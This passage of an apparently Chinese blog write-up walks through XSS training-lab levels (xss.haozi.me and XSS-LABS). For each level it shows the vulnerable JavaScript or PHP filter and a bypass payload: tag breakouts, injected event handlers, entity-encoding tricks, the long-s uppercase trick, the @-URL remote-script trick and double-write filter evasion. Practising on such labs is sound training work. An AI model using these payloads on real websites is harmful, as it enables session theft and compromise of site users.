&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  let domainRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>https<span class="token operator">?</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span>www\<span class="token punctuation">.</span>segmentfault\<span class="token punctuation">.</span>com<span class="token operator">/</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;input&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>`
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：必须要含有http：//www。segmentfault.com才行</p>
<pre><code>http://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#39;')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>"<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;#x2f'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

  <span class="token keyword">const</span> domainRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>https<span class="token operator">?</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span>www\<span class="token punctuation">.</span>segmentfault\<span class="token punctuation">.</span>com<span class="token operator">/</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;escapeHtml(input)&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>`
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：这个过滤跟没过滤没区别还属于html标签内，实体编码会生效。</p>
<pre><code>https://www.segmentfault.com@xss.haozi.me/j.js</code></pre>
<p>注：如果你在浏览器输入以下内容看看会访问哪个网页</p>
<pre><code>www.baidu.com@www.google.com</code></pre>
<h5 id="0x0B"><a href="#0x0B" class="headerlink" title="#0x0B"></a>#0x0B</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>$<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：将内容大写</p>
<p>注：HTML对大小写不敏感，JS对大小写敏感。所以可以采用实体编码绕过</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;h1&gt;</code></pre>
<h5 id="0x0C"><a href="#0x0C" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return <h1> + input + </h1>
&#125;</code></pre>
<p>代码分析：就比上关多过滤个script</p>
<pre><code>&lt;img src=&quot;#&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;h1&gt;</code></pre>
<h5 id="0x0D"><a href="#0x0D" class="headerlink" title="#0x0D"></a>#0x0D</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">/</span>"<span class="token string">']/g, '</span>'<span class="token punctuation">)</span>
  <span class="token keyword">return</span> `
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
          <span class="token comment" spellcheck="true">// alert('$&amp;#123;input&amp;#125;')</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了&lt; , / , “ , ‘</p>
<p>注：JS中，–&gt;也代表注释，先换行绕过//单行注释</p>
<pre><code>
alert(1)
--&gt;</code></pre>
<h5 id="0x0E-我没成功，但我个人觉得应该可以的！！"><a href="#0x0E-我没成功，但我个人觉得应该可以的！！" class="headerlink" title="#0x0E(我没成功，但我个人觉得应该可以的！！)"></a>#0x0E(我没成功，但我个人觉得应该可以的！！)</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&lt;_$1'</span><span class="token punctuation">)</span>
  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;h1>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/h1>'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了&lt;开头下个是字母的所有内容。</p>
<p>注：ſ 被大写后就是S</p>
<pre><code>&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;</code></pre>
<h5 id="0x0F"><a href="#0x0F" class="headerlink" title="#0x0F"></a>#0x0F</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#39;')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>"<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;#x2f;'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console.error(<span class="token punctuation">'</span>$&amp;#123;escapeHtml(input)&amp;#125;<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：这个过滤也跟没过滤一样（代码生效地方），主要就是拼接。</p>
<pre><code>1&#39;);alert(1);(&#39;</code></pre>
<h5 id="0x10"><a href="#0x10" class="headerlink" title="#0x10"></a>#0x10</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">return</span> `
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
  window<span class="token punctuation">.</span>data <span class="token operator">=</span> $<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;input&amp;#125;</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
  `
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：这关就不分析</p>
<pre><code>1;alert(1)</code></pre>
<h5 id="0x11"><a href="#0x11" class="headerlink" title="#0x11"></a>#0x11</h5><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// from alf.nu</span>
<span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">function</span> <span class="token function">escapeJs</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span>\<span class="token package"><span class="token punctuation">\</span><span class="token punctuation">\</span></span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>`<span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\`'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\74'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\76'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\/'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">n</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">r</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\r'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">t</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">f</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\f'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">v</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\v'</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">// .replace(/\b/g, '\\b')</span>
            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token package">0</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'\\0'</span><span class="token punctuation">)</span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
  s <span class="token operator">=</span> <span class="token function">escapeJs</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
  <span class="token keyword">return</span> `

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
  <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'javascript:console.log("$&amp;#123;s&amp;#125;")'</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
  a<span class="token punctuation">.</span>href <span class="token operator">=</span> url
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>

`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤了很多符号，但还是可以绕过“虽然被过滤，但\正好可以作为前面的内容，/虽然也被过滤，但两个/过滤之后还是注释的效果。</p>
<pre><code>&quot;);alert(1)//</code></pre>
<h5 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h5><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// from alf.nu</span>
<span class="token keyword">function</span> <span class="token function">escape</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>代码分析：过滤”，感觉还不如上关。</p>
<pre><code>&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>总结下吧：这个靶场很适合像作者这种刚入门XSS的菜鸟去刷刷。</p>
<h3 id="XSS-LABS"><a href="#XSS-LABS" class="headerlink" title="XSS-LABS"></a>XSS-LABS</h3><h5 id="0x01-1"><a href="#0x01-1" class="headerlink" title="#0x01"></a>#0x01</h5><p>#代码利用</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x02-1"><a href="#0x02-1" class="headerlink" title="#0x02"></a>#0x02</h5><p>代码回显的位置在标签内</p>
<pre class=" language-php"><code class="language-php"><span class="token markup">&lt;input name=keyword  value="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>"<span class="token operator">></span></code></pre>
<p>#代码利用</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x03-1"><a href="#0x03-1" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span></code></pre>
<p>利用函数对输入的内容进行了过滤。查看网页源代码</p>
<pre><code>&lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt;    </code></pre>
<p>#代码利用</p>
<pre><code>&#39; onclick=&#39;alert(1)</code></pre>
<h5 id="0x04-1"><a href="#0x04-1" class="headerlink" title="#0x04"></a>#0x04</h5><p>和第3一样但注意到两关闭合使用的引号不同这关是”。</p>
<p>#代码利用</p>
<pre><code>&quot; onclick=&quot;alert(1)</code></pre>
<h5 id="0x05-1"><a href="#0x05-1" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>过滤了on和&lt;script</p>
<p>#代码利用</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x06-1"><a href="#0x06-1" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>过滤了更多，大小写混合绕过</p>
<p>#代码利用</p>
<pre><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x07-1"><a href="#0x07-1" class="headerlink" title="#0x07"></a>#0x07</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>这关是替换成空，代码叠加绕过</p>
<p>#代码利用</p>
<pre><code>&quot;&gt;&lt;a hrhrefef=&quot;javascscriptript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x08-1"><a href="#0x08-1" class="headerlink" title="#0x08"></a>#0x08</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span></code></pre>
<p>可以利用HTML实体编码绕过，&amp;#82；代表R</p>
<p>#代码利用</p>
<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
<h5 id="0x09-1"><a href="#0x09-1" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">else</span>
